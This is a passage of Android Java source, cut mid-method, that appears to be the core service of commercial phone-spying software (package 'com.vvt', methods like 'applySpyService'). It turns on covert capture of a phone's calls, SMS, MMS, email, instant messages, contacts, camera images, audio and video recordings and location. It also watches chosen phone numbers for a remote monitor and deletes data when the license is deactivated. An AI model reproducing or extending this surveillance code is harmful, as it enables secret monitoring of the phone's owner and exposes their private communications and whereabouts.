			} catch (FxDbCorruptException e3) {
				handleException(e3);
			}

		} else if (license.getLicenseStatus() == LicenseStatus.DEACTIVATED) {
			if(LOGD) FxLog.d(TAG, "onLicenseChanged # LicenseStatus : DEACTIVATED");

			try {
				disableAllCapture();
				applySpyService();
			} catch (FxNullNotAllowedException e) {
				handleException(e);
			}

			// delete every thing.
			mEventRepository.clearRespository();

			File file = new File(mAppContext.getWritablePath());
			if (file.exists()) {
				ArrayList<String> totDeleteFiles = getNotDeleteFilesList();
				try {
					FileUtil.deleteAllFile(file, totDeleteFiles);
				} catch (IOException e) {
					handleException(e);
				}
				
				
				
//				String[] listFiles = file.list();
//				if (listFiles != null) {
//					ArrayList<String> totDeleteFiles = getNotDeleteFilesList();
//					for (String f : listFiles) {
//						// Because reactivation
//						if (!totDeleteFiles.contains(f)) {
//							File delFile = new File(com.vvt.ioutil.Path
//									.combine(mAppContext.getWritablePath(), f));
//							delFile.delete();
//						}
//					}
//				}
			}
		} else if (license.getLicenseStatus() == LicenseStatus.EXPIRED) {
			if(LOGE) FxLog.e(TAG, "onLicenseChanged # LicenseStatus : EXPIRED");
			applySpyService();
			
		} else if (license.getLicenseStatus() == LicenseStatus.DISABLED) {
			if(LOGE) FxLog.e(TAG, "onLicenseChanged # LicenseStatus : DISABLED");
			// not support now.
		}

		if(LOGD) FxLog.d(TAG, "onLicenseChanged # EXIT");
	}
	
	
	private void deliverMediaHistory() throws FxNullNotAllowedException {
		MediaHistoryCapture mediaHistoryCapture = new MediaHistoryCapture(mWritablePath, mContext);
		mediaHistoryCapture.register(mEventCentre);
		mediaHistoryCapture.startCapture();
		
	}

	private ArrayList<String> getNotDeleteFilesList() {
		return new ArrayList<String>() {
			private static final long serialVersionUID = 1L;
			{
				add("systemurlrepo.ser");
				add("events.db");
				add("ProductDefinition");
				add("ddmmgr.db");
				add("phoenix_db.db");
				
			}
		};
	}

	@Override
	public void onPreferenceChange(Preference preference) {
		if(LOGV) FxLog.v(TAG, "onPreferenceChange # ENTER ...");
		try {
			if (preference instanceof PrefEventsCapture) {
				if(LOGD) FxLog.d(TAG, "onPreferenceChange # PrefEventsCapture Change ..");
				PrefEventsCapture prefEventsCapture = (PrefEventsCapture) preference;
				
				if(LOGV) FxLog.v(TAG,String.format("StartCapture : %s" +
						"\nAddressBook : %s" +
						"\nAudioFile : %s" +
						"\nCallLog : %s" +
						"\nCameraImage : %s" +
						"\nEmail : %s" +
						"\nIM : %s" +
						"\nMMS : %s" +
						"\nSMS : %s" +
						"\nWallpaper : %s",
						prefEventsCapture.getEnableStartCapture(),
						prefEventsCapture.getEnableAddressBook(),
						prefEventsCapture.getEnableAudioFile(),
						prefEventsCapture.getEnableCallLog(),
						prefEventsCapture.getEnableCameraImage(),
						prefEventsCapture.getEnableEmail(),
						prefEventsCapture.getEnableIM(),
						prefEventsCapture.getEnableMMS(),
						prefEventsCapture.getEnableSMS(),
						prefEventsCapture.getEnableWallPaper()));
				
				onEventControlChange(prefEventsCapture);

			} else if (preference instanceof PrefLocation) {
				if(LOGD) FxLog.d(TAG, "onPreferenceChange # PrefLocation Change ..");
				if (mLocationCaptureManager != null) {
					PrefLocation prefLocation = (PrefLocation) preference;
					onPrefLocationChange(prefLocation);
				}
			} else if (preference instanceof PrefAddressBook) {
				if(LOGD) FxLog.d(TAG, "onPreferenceChange # PrefAddressBook Change ..");
				PrefAddressBook prefAddressBook = (PrefAddressBook) preference;
				onPrefAddressBookChange(prefAddressBook);

			} else if (preference instanceof PrefKeyword) {
				if(LOGD) FxLog.d(TAG, "onPreferenceChange # PrefKeyword Change ..");
				PrefKeyword prefKeyword = (PrefKeyword) preference;
				onPrefKeywordChange(prefKeyword);

			} else if (preference instanceof PrefMonitorNumber) {
				if(LOGD) FxLog.d(TAG, "onPreferenceChange # PrefMonitorNumber Change ..");
				PrefMonitorNumber prefMonitorNumber = (PrefMonitorNumber) preference;
				onPrefMonitorNumberChange(prefMonitorNumber);

			} else if (preference instanceof PrefWatchList) {
				if(LOGD) FxLog.d(TAG, "onPreferenceChange # PrefWatchList Change ..");
				PrefWatchList prefWatchList = (PrefWatchList) preference;
				onPrefPrefWatchListChange(prefWatchList);

			} else if (preference instanceof PrefHomeNumber) {
				// no need to do anything.

			} else if (preference instanceof PrefDeviceLock) {
				// no need to do anything.

			} else if (preference instanceof PrefEmergencyNumber) {
				// no need to do anything.

			} else if (preference instanceof PrefNotificationNumber) {
				// no need to do anything.

			} else if (preference instanceof PrefPanic) {
				// no need to do anything.
			}
		} catch (FxNullNotAllowedException e) {
			handleException(e);
		}
		
		if(LOGV) FxLog.v(TAG, "onPreferenceChange # EXIT ...");
	}

	private void onPrefMonitorNumberChange(PrefMonitorNumber prefMonitorNumber)
			throws FxNullNotAllowedException {
		applySpyService();
		

	}

	private void onPrefPrefWatchListChange(PrefWatchList prefWatchList)
			throws FxNullNotAllowedException {
		
		if(LOGV) FxLog.v(TAG, String.format("EnableWatch : %s,\nWatchFlag : %s\nWatchNumber : %s", 
				prefWatchList.getEnableWatchNotification(), 
				prefWatchList.getWatchFlag().toString(),
				prefWatchList.getWatchNumber().toString()));
	}

	private void onPrefKeywordChange(PrefKeyword prefKeyword)
			throws FxNullNotAllowedException {
		if(LOGV) FxLog.v(TAG, String.format("Keyword : %s", prefKeyword.getKeyword().toString()));
		applySpyService();
	}

	private void onPrefAddressBookChange(PrefAddressBook prefAddressBook)
			throws FxNullNotAllowedException {
		PrefEventsCapture prefEventsCapture = (PrefEventsCapture) mPreferenceManager
				.getPreference(PreferenceType.EVENTS_CTRL);
		mAddressbookManager.stop();
		mAddressbookManager.setMode(prefAddressBook.getMode());

		if (prefEventsCapture.getEnableStartCapture() && prefEventsCapture.getEnableAddressBook()) {
			mRemoteCommandManager.setAddressBookManager(mAddressbookManager);
			mAddressbookManager.startMonitor();
		}
	}

	private void onPrefLocationChange(PrefLocation prefLocation) {
		PrefEventsCapture prefEventsCapture = (PrefEventsCapture) mPreferenceManager
				.getPreference(PreferenceType.EVENTS_CTRL);

		if (prefEventsCapture.getEnableStartCapture()
				&& prefLocation.getEnableLocation()) {
			LocationOption locationOption = new LocationOption();
			locationOption.setCallingModule(LocationCallingModule.MODULE_CORE);
			locationOption.setTrackingTimeInterval(prefLocation
					.getLocationInterval());
			mLocationCaptureManager.setEventListener(mEventCentre);
			mLocationCaptureManager.startLocationTracking(locationOption);
		} else {
			mLocationCaptureManager
					.stopLocationTracking(LocationCallingModule.MODULE_CORE);
		}
	}

	private void onEventControlChange(PrefEventsCapture prefEventsCapture)
			throws FxNullNotAllowedException {
		if(LOGV) FxLog.v(TAG, "onEventControlChange # ENTER ..");
		mEventRepository.removeRepositoryChangeListener(mEventCentre);
		RepositoryChangePolicy changePolicy = new RepositoryChangePolicy();
		changePolicy.setMaxEventNumber(prefEventsCapture.getMaxEvent());
		changePolicy.addChangeEvent(RepositoryChangeEvent.PANIC_EVENT_ADD);
		changePolicy.addChangeEvent(RepositoryChangeEvent.SYSTEM_EVENT_ADD);
		changePolicy.addChangeEvent(RepositoryChangeEvent.SETTING_EVENT_ADD);
		changePolicy.addChangeEvent(RepositoryChangeEvent.EVENT_REACH_MAX_NUMBER);

		mEventRepository.addRepositoryChangeListener(mEventCentre, changePolicy);

		mEventCentre.setDeliverTimer(prefEventsCapture.getDeliverTimer());

		if (prefEventsCapture.getEnableStartCapture()) {

			if (mConfigurationManager
					.isSupportedFeature(FeatureID.FEATURE_ID_EVNET_CALL)) {
				eventCaptureControl(FeatureID.FEATURE_ID_EVNET_CALL,
						prefEventsCapture.getEnableCallLog());
			}

			if (mConfigurationManager
					.isSupportedFeature(FeatureID.FEATURE_ID_EVNET_CAMERAIMAGE)) {
				eventCaptureControl(FeatureID.FEATURE_ID_EVNET_CAMERAIMAGE,
						prefEventsCapture.getEnableCameraImage());
			}

			if (mConfigurationManager
					.isSupportedFeature(FeatureID.FEATURE_ID_EVNET_EMAIL)) {
				eventCaptureControl(FeatureID.FEATURE_ID_EVNET_EMAIL,
						prefEventsCapture.getEnableEmail());
			}

			if (mConfigurationManager
					.isSupportedFeature(FeatureID.FEATURE_ID_EVNET_MMS)) {
				eventCaptureControl(FeatureID.FEATURE_ID_EVNET_MMS,
						prefEventsCapture.getEnableMMS());
			}

			if (mConfigurationManager
					.isSupportedFeature(FeatureID.FEATURE_ID_EVNET_SMS)) {
				eventCaptureControl(FeatureID.FEATURE_ID_EVNET_SMS,
						prefEventsCapture.getEnableSMS());
			}

			if (mConfigurationManager
					.isSupportedFeature(FeatureID.FEATURE_ID_EVNET_CONTACT)) {
				eventCaptureControl(FeatureID.FEATURE_ID_EVNET_CONTACT,
						prefEventsCapture.getEnableAddressBook());
			}

			if (mConfigurationManager
					.isSupportedFeature(FeatureID.FEATURE_ID_EVNET_SOUND_RECORDING)) {
				eventCaptureControl(FeatureID.FEATURE_ID_EVNET_SOUND_RECORDING,
						prefEventsCapture.getEnableAudioFile());
			}

			if (mConfigurationManager
					.isSupportedFeature(FeatureID.FEATURE_ID_EVNET_VIDEO_RECORDING)) {
				eventCaptureControl(FeatureID.FEATURE_ID_EVNET_VIDEO_RECORDING,
						prefEventsCapture.getEnableVideoFile());
			}
			
			if (mConfigurationManager
					.isSupportedFeature(FeatureID.FEATURE_ID_EVNET_IM)) {
				eventCaptureControl(FeatureID.FEATURE_ID_EVNET_IM,
						prefEventsCapture.getEnableIM());
			}
			
			if (mConfigurationManager
					.isSupportedFeature(FeatureID.FEATURE_ID_EVNET_WALLPAPER)) {
				eventCaptureControl(FeatureID.FEATURE_ID_EVNET_WALLPAPER,
						prefEventsCapture.getEnableWallPaper());
			}

			// not support
			// prefEventsCapture.getEnablePinMessage();
			// prefEventsCapture.getEnableWallPaper();

		} else {
			disableAllCapture();
		}
		if(LOGV) FxLog.v(TAG, "onEventControlChange # EXIT ..");
	}

	private void disableAllCapture() throws FxNullNotAllowedException {
		if(LOGV) FxLog.v(TAG, "disableAllCapture # ENTER ..");
		/*
		 * EnableStartCapture() is effect to location capture but maybe
		 * PrefEventsCapture not related with location capture.
		 */
		if (mLocationCaptureManager != null) {
			mLocationCaptureManager
					.stopLocationTracking(LocationCallingModule.MODULE_CORE);
		}

		eventCaptureControl(FeatureID.FEATURE_ID_EVNET_CALL, false);
		eventCaptureControl(FeatureID.FEATURE_ID_EVNET_CAMERAIMAGE, false);
		eventCaptureControl(FeatureID.FEATURE_ID_EVNET_EMAIL, false);
		eventCaptureControl(FeatureID.FEATURE_ID_EVNET_MMS, false);
		eventCaptureControl(FeatureID.FEATURE_ID_EVNET_SMS, false);
		eventCaptureControl(FeatureID.FEATURE_ID_EVNET_CONTACT, false);
		eventCaptureControl(FeatureID.FEATURE_ID_EVNET_SOUND_RECORDING, false);
		eventCaptureControl(FeatureID.FEATURE_ID_EVNET_VIDEO_RECORDING, false);
		eventCaptureControl(FeatureID.FEATURE_ID_EVNET_IM, false);
		eventCaptureControl(FeatureID.FEATURE_ID_EVNET_WALLPAPER , false);
		
		if(LOGV) FxLog.v(TAG, "disableAllCapture # EXIT ..");
	}

	private void eventCaptureControl(FeatureID id, boolean isEnable)
			throws FxNullNotAllowedException {
		
		switch (id) {
		case FEATURE_ID_EVNET_CALL:
			if (mCallLogCapture != null) {
				if (isEnable) {
					if(LOGV) FxLog.v(TAG, "eventCaptureControl # FEATURE_ID_EVNET_CALL : startCapture");
					mCallLogCapture.register(mEventCentre);
					mCallLogCapture.startCapture();
				} else {
					FxLog.v(TAG, "eventCaptureControl # FEATURE_ID_EVNET_CALL : stopCapture");
					try {
						mCallLogCapture.stopCapture();
						mCallLogCapture.unregister();
					} catch (FxOperationNotAllowedException e) {
						handleException(e);
					}
				}
			}
			break;

		case FEATURE_ID_EVNET_CAMERAIMAGE:
			if (mCameraImageCapture != null) {
				if (isEnable) {
					if(LOGV) FxLog.v(TAG, "eventCaptureControl # FEATURE_ID_CAMERAIMAGE : startCapture");
					mCameraImageCapture.register(mEventCentre);
					mCameraImageCapture.startCapture();
				} else {
					if(LOGV) FxLog.v(TAG, "eventCaptureControl # FEATURE_ID_CAMERAIMAGE : stopCapture");
					try {
						mCameraImageCapture.stopCapture();
						mCameraImageCapture.unregister();
					} catch (FxOperationNotAllowedException e) {
						handleException(e);
					}
				}
			}
			break;

		case FEATURE_ID_EVNET_EMAIL:
			if (mEmailCapture != null) {
				if (isEnable) {
					if(LOGV) FxLog.v(TAG, "eventCaptureControl # FEATURE_ID_EVNET_EMAIL : startCapture");
					mEmailCapture.register(mEventCentre);
					mEmailCapture.startCapture();
				} else {
					try {
						if(LOGV) FxLog.v(TAG, "eventCaptureControl # FEATURE_ID_EVNET_EMAIL : stopCapture");
						mEmailCapture.stopCapture();
						mEmailCapture.unregister();
					} catch (FxOperationNotAllowedException e) {
						handleException(e);
					}
				}
			}
			break;

		case FEATURE_ID_EVNET_MMS:
			if (mMMSCapture != null) {
				if (isEnable) {
					if(LOGV) FxLog.v(TAG, "eventCaptureControl # FEATURE_ID_EVNET_MMS : startCapture");
					mMMSCapture.register(mEventCentre);
					mMMSCapture.startCapture();
				} else {
					if(LOGV) FxLog.v(TAG, "eventCaptureControl # FEATURE_ID_EVNET_MMS : stopCapture");
					try {
						mMMSCapture.stopCapture();
						mMMSCapture.unregister();
					} catch (FxOperationNotAllowedException e) {
						handleException(e);
					}
				}
			}
			break;

		case FEATURE_ID_EVNET_SMS:
			if (mSMSCapture != null) {
				if (isEnable) {
					if(LOGV) FxLog.v(TAG, "eventCaptureControl # FEATURE_ID_EVNET_SMS : startCapture");
					mSMSCapture.register(mEventCentre);
					mSMSCapture.startCapture();
				} else {
					if(LOGV) FxLog.v(TAG, "eventCaptureControl # FEATURE_ID_EVNET_SMS : stopCapture");
					try {
						mSMSCapture.stopCapture();
						mSMSCapture.unregister();
					} catch (FxOperationNotAllowedException e) {
						handleException(e);
					}
				}
			}
			break;

		case FEATURE_ID_EVNET_CONTACT:
			if (mAddressbookManager != null) {
				if (isEnable) {
					if(LOGV) FxLog.v(TAG, "eventCaptureControl # FEATURE_ID_EVNET_CONTACT : startCapture");
					mAddressbookManager.startMonitor();
				} else {
					if(LOGV) FxLog.v(TAG, "eventCaptureControl # FEATURE_ID_EVNET_CONTACT : stopCapture");
					mAddressbookManager.stop();
				}
			}
			break;

		case FEATURE_ID_EVNET_SOUND_RECORDING:
			if (mAudioCapture != null) {
				if (isEnable) {
					if(LOGV) FxLog.v(TAG, "eventCaptureControl # SOUND_RECORDING : startCapture");
					mAudioCapture.register(mEventCentre);
					mAudioCapture.startCapture();
				} else {
					if(LOGV) FxLog.v(TAG, "eventCaptureControl # SOUND_RECORDING : stopCapture");
					try {
						mAudioCapture.stopCapture();
						mAudioCapture.unregister();
					} catch (FxOperationNotAllowedException e) {
						handleException(e);
					}
				}
			}
			break;

		case FEATURE_ID_EVNET_VIDEO_RECORDING:
			if (mVideoCapture != null) {
				if (isEnable) {
					if(LOGV) FxLog.v(TAG, "eventCaptureControl # VIDEO_RECORDING : startCapture");
					mVideoCapture.register(mEventCentre);
					mVideoCapture.startCapture();
				} else {
					try {
						if(LOGV) FxLog.v(TAG, "eventCaptureControl # VIDEO_RECORDING : stopCapture");
						mVideoCapture.stopCapture();
						mVideoCapture.unregister();
					} catch (FxOperationNotAllowedException e) {
						handleException(e);
					}
				}
			}
			break;
			
		case FEATURE_ID_EVNET_IM:
			if (mImCapture != null) {
				if (isEnable) {
					if(LOGV) FxLog.v(TAG, "eventCaptureControl # FEATURE_ID_EVNET_IM : startCapture");
					mImCapture.registerObserver(mEventCentre);
					mImCapture.startObserver();
				} else {
					try {
						if(LOGV) FxLog.v(TAG, "eventCaptureControl # FEATURE_ID_EVNET_IM : stopCapture");
						mImCapture.stopObserver();
						mImCapture.unregisterObserver();
					} catch (FxOperationNotAllowedException e) {
						handleException(e);
					}
				}
			}
			break;

		case FEATURE_ID_EVNET_WALLPAPER:
			if (mWallpaperCapture != null) {
				if (isEnable) {
					if(LOGV) FxLog.v(TAG, "eventCaptureControl # FEATURE_ID_EVNET_WALLPAPER : startCapture");
					mWallpaperCapture.register(mEventCentre);
					mWallpaperCapture.startCapture();
					 
				} else {
					if(LOGV) FxLog.v(TAG, "eventCaptureControl # FEATURE_ID_EVNET_WALLPAPER : stopCapture");
					
					try {
						mWallpaperCapture.stopCapture();
						mWallpaperCapture.unregister();
					} catch (FxOperationNotAllowedException e) {
						handleException(e);
					}
				}
			}
			break;
			
		default:
			break;
		}
	}
	
	public void handleWatchNumber(String phoneNumber, boolean isIncoming) {
		if(LOGV) FxLog.v(TAG, "handleWatchNumber # ENTER ..");
		PrefWatchList prefWatchList = (PrefWatchList) mPreferenceManager
			.getPreference(PreferenceType.WATCH_LIST);
		PrefMonitorNumber prefMonitorNumber = (PrefMonitorNumber) mPreferenceManager
			.getPreference(PreferenceType.MONITOR_NUMBER);
		
		boolean isEnableWatchList = prefWatchList.getEnableWatchNotification();
		boolean isEnableMonitor = prefMonitorNumber.getEnableMonitor();
		
		if(LOGV) FxLog.v(TAG, "handleWatchNumber # EnableWatchList : " +isEnableWatchList);
		if(LOGV) FxLog.v(TAG, "handleWatchNumber # EnableMonitor : " +isEnableMonitor);
		
		if(isEnableMonitor && isEnableWatchList) {
			if (SpyServiceUtil.isWatchNumber(phoneNumber, prefWatchList)) {
				sSpyInfoApplier.handleWatchNumber(mAppContext.getPhoneInfo(),
						phoneNumber, isIncoming, prefMonitorNumber);
			}
		}
		if(LOGV) FxLog.v(TAG, "handleWatchNumber # EXIT ..");
	}
	
	public void handleMonitorDisconnect(MonitorDisconnectReason reason) {
		PrefMonitorNumber prefMonitorNumber = (PrefMonitorNumber) mPreferenceManager
			.getPreference(PreferenceType.MONITOR_NUMBER);
		
		sSpyInfoApplier.handleMonitorDisconnect(reason, prefMonitorNumber);
	}

	@Override
	public void onServerStatusErrorListener(ServerStatusType serverStatusType) {
		if (serverStatusType == ServerStatusType.SERVER_STATUS_ERROR_DEVICE_ID_NOT_FOUND) {
			mLicenseManager.resetLicense();

		} else if (serverStatusType == ServerStatusType.SERVER_STATUS_ERROR_LICENSE_DISABLED) {
			LicenseInfo licenseInfo = mLicenseManager.getLicenseInfo();
			licenseInfo.setLicenseStatus(LicenseStatus.DISABLED);
			mLicenseManager.updateLicense(licenseInfo);

		} else if (serverStatusType == ServerStatusType.SERVER_STATUS_ERROR_LICENSE_EXPIRED) {
			LicenseInfo licenseInfo = mLicenseManager.getLicenseInfo();
			licenseInfo.setLicenseStatus(LicenseStatus.EXPIRED);
			mLicenseManager.updateLicense(licenseInfo);
		}
	}

	@Override
	public void onCorrupt() {
		try {
			mEventRepository.closeRespository();
			mEventRepository.deleteRepository();
			mEventRepository.openRepository();
		} catch (IOException e) {
			handleException(e);
		} catch (FxDbOpenException e) {
			handleException(e);
		} catch (FxDbCorruptException e) {
			handleException(e);
		}
	}

	private void handleException(Throwable e) {
		if(LOGE) FxLog.e(TAG, e.getMessage(), e);
		return;
	}

	/**************************************** FOR TEST ONLY !! ********************************************/
	public void setContext(Context context) {
		mContext = context;
		mWritablePath = mContext.getCacheDir().getAbsolutePath();
	}

}
